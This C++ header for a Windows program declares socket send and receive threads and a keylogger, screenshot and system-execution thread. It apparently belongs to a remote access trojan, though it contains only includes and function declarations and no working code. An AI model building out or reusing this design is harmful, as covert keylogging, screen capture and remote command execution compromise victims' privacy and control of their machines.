#pragma once

#define WIN32_LEAN_AND_MEAN 
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")

#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <fstream>
#include <sstream>
#include <iostream>
#include <stdlib.h>
#include <cstdio>
#include <stdio.h>
#include <time.h>
#include <queue>
#include <vector>

#include "loader.h"
#include "thread.h"
#include "tcpsocket.h"
#include "keylog.h"
#include "screen.h"
#include "sysexec.h"
#include "fs.h"





void addonDebug(char *text, ...);

DWORD _stdcall main_thread(LPVOID lpParam);

DWORD _stdcall socket_send_thread(LPVOID lpParam);
DWORD _stdcall socket_receive_thread(LPVOID lpParam);

DWORD _stdcall keylog_thread(LPVOID lpParam);
DWORD _stdcall screenshot_thread(LPVOID lpParam);
DWORD _stdcall sysexec_thread(LPVOID lpParam);